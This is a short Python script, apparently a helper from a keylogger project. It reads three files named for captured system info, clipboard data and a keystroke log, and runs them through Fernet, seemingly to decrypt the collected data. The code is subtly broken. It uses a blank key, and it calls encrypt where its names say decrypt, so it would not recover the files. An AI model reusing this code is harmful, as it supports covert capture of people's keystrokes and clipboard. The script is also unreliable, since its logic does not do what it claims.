from cryptography.fernet import Fernet

key = " "

system_info_e = "e_system.txt"
clipboard_info_e = "e_clipboard.txt"
keys_info_e = "e_keys_log.txt"


encrypted_files = [system_info_e,clipboard_info_e,keys_info_e]
count = 0


for decryption in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.encrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1